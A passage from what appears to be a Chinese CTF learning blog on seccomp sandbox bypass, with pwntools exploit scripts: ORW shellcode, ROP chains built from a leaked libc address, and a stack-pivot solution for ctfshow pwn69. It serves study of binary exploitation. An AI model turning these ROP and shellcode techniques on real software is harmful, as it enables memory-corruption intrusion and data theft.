<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x4           ; 调用sys_write (系统调用号4)</span><br><span class="line">xor ebx, ebx           ; 清空ebx，作为文件描述符1（标准输出）</span><br><span class="line">int 0x80               ; 触发中断，执行系统调用</span><br></pre></td></tr></table></figure>

<p>还可以通过传参传入flag的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fd = open(&#x27;home/pwn/flag&#x27;,0) 0x804a094根据具体情况而定</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;&#x27; xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read(fd,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(1,0x804a094,0x20) </span></span><br><span class="line">s += <span class="string">&#x27;&#x27;&#x27; mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(s)+<span class="string">b&#x27;/home/pwn/flag\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第二种直接利用pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)        <span class="comment"># Open &#x27;flag&#x27; (fd returned in EAX)</span></span><br><span class="line">payload += shellcraft.read(<span class="number">3</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)  <span class="comment"># Read from opened FD</span></span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, <span class="number">0x804a090</span>, <span class="number">0x100</span>)     <span class="comment"># Write to stdout (FD 1)</span></span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line"><span class="comment">#不知道为什么没打通理论上是可以的</span></span><br></pre></td></tr></table></figure>



<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h5><p>例题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  gift();</span><br><span class="line">  init_sandbox();</span><br><span class="line">  sandboxx();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sandboxx</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the Sandbox Challenge&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe you need an open read wirte &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you a nice little gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Leak: %p\n&quot;</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./sandbox&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">         gdb.attach(p)</span><br><span class="line">         pause()</span><br><span class="line">        </span><br><span class="line">bss=<span class="number">0x404020</span>+<span class="number">0x800</span></span><br><span class="line">sandboxx = <span class="number">0x4013ED</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">rdi=libc_base+<span class="number">0x0000000000023b6a</span> </span><br><span class="line">rsi=libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119431</span></span><br><span class="line">rsp = libc_base + <span class="number">0x000000000002f70a</span></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_addr)+p64(rsp)+p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;name:&quot;</span>)</span><br><span class="line">p.send(payload2) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  =<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(bss)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">3</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(rdi)</span><br><span class="line">payload +=p64(<span class="number">1</span>)</span><br><span class="line">payload +=p64(rsi)</span><br><span class="line">payload +=p64(bss+<span class="number">0x600</span>)</span><br><span class="line">payload +=p64(rdx_r12)</span><br><span class="line">payload +=p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(write_addr) </span><br><span class="line">payload +=p64(sandboxx )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<p>江西省赛</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./vuln&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;&quot;</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x19f2)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/zacsn/.config/cpwn/pkgs/2.31-</span></span><br><span class="line"><span class="string">0ubuntu9.17/amd64/libc6-dbg_2.31-0ubuntu9.17_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/zacsn/.config/cpwn/pkgs/2.31-0ubuntu9.17/amd64/glibcsource_2.31-0ubuntu9.17_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> : io.recvline()</span><br><span class="line">rn = <span class="keyword">lambda</span> counts : io.recvn(counts)</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">iuu32 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">iuu64 = <span class="keyword">lambda</span> : <span class="built_in">int</span>(io.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">uheap = <span class="keyword">lambda</span> : u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"><span class="comment">#gdb.debug(elf.path,gdbscript=gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript = gs)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013d3</span></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x4012f9</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">puts_addr = u64(rn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">lg(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x0000000000142c92</span></span><br><span class="line">pop_rax = libc_addr + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall = libc_addr+libc.search(asm(<span class="string">&quot;&quot;&quot;syscall;ret&quot;&quot;&quot;</span>)).__next__()</span><br><span class="line">bss_addr = <span class="number">0x404200</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;hello sandbox!&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(<span class="number">0x10</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload2 += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(bss_addr + <span class="number">0x100</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&quot;./flag\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>今天先写到这✍️，以后还会接着写📖，但是明天就要开始着手学堆了🔥，不然很多比赛都打不了🏆💪。</p>
<h2 id="ctfshow-pwn69"><a href="#ctfshow-pwn69" class="headerlink" title="ctfshow pwn69"></a>ctfshow pwn69</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>可以看到orw是可以的，所以我们要先利用read将orw读到</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27;28191&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp_addr = <span class="number">0x400a01</span></span><br><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;do&#x27;</span>)</span><br><span class="line">p.sendline(buf_shellcode)</span><br><span class="line">p.sendline(orw_shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这一部分是标准的orw</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode = asm(orw_shellcode)</span><br></pre></td></tr></table></figure>

<p>这部分我来详细解释一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf_shellcode = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) + asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">buf_shellcode = buf_shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">buf_shellcode += p64(jmp_rsp_addr) + asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure>

<p> asm(shellcraft.read(0,mmap,100)):这是汇编代码，用于调用read系统调用，从标准输入读取最多100字节的数据到地址0x123000。</p>
<p>asm(“mov rax,0x123000; jmp rax”)：先将0x123000放入rax，然后jmp rax执行shellcode,为什么是sellcode呢等下再说。</p>
<p>p64(jmp_rsp_addr)：将返回地址覆盖成jmp rsp,此时程序跳转到 <code>rsp</code> 指向的位置,即 <code>asm(&quot;sub rsp, 0x30; jmp rsp&quot;)</code>因为pop ebp后rsp</p>
<p>增高0x08。</p>
<p>asm(“sub rsp,0x30; jmp rsp”):sub rsp,0x30使得rsp减0x30到达了buf的起始位置，jmp rsp就开始执行了。</p>
<p>然后我来看看整个流程。</p>
<p>p.sendline(buf_shellcode)后,栈上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read(0,mmap,100)</span><br><span class="line">buf_shellcode.ljust(0x28,b&#x27;\x00&#x27;)</span><br><span class="line">p64(jmp_rsp_addr)   # return_addr</span><br><span class="line">asm(&quot;sub rsp,0x30; jmp rsp&quot;)</span><br></pre></td></tr></table></figure>

<p>有第二部分的分析我们知道rsp此时已经达到buf的起始位置开始执行read了，所以我们才有第二次send。</p>
<p>我们把标准的orw输入后，同理rsp又会回到起始位置开始执行orw，最终得到flag。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/06/28/%E6%A0%88%E8%BF%81%E7%A7%BB%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">栈迁移专题学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-06-28 09:17:14" itemprop="dateCreated datePublished" datetime="2025-06-28T09:17:14+08:00">2025-06-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:15:08" itemprop="dateModified" datetime="2025-09-23T21:15:08+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
